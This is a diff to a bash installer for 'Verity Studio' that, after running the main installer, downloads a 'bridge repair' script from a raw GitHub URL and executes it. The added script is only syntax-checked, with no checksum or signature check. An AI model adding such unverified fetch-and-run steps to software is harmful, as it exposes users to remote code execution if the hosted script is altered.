@@ -19,6 +19,13 @@ curl --proto '=https' --tlsv1.2 --fail --location --silent --show-error --retry 
 [[ "$(head -n 1 "$installer")" == '#!/usr/bin/env bash' ]] || { echo '[Verity Studio] Invalid installer.' >&2; exit 1; }
 grep -q '^__VERITY_STUDIO_PAYLOAD__$' "$installer" || { echo '[Verity Studio] Missing bundled Studio Mode payload.' >&2; exit 1; }
 bash -n "$installer"
-exec_status=0
-bash "$installer" "$@" || exec_status=$?
-exit "$exec_status"
+# Once the v1.3.0 app is installed, upgrade its Python MCP transport in-place.
+# This is only a bridge repair; it does not recompile or replace the Mac app.
+bash "$installer" "$@"
+repair_url='https://raw.githubusercontent.com/celineasher/NewRepo/master/verity-mac/repair-studio-bridge.sh'
+repair="$(mktemp "${TMPDIR:-/tmp}/verity-bridge-fix.XXXXXXXX")"
+trap 'rm -f "$installer" "$repair"' EXIT
+printf '[Verity Studio] Installing MCP timeout/diagnostic fix…\n'
+curl --proto '=https' --tlsv1.2 --fail --location --silent --show-error --retry 2 "$repair_url" -o "$repair"
+bash -n "$repair"
+bash "$repair"
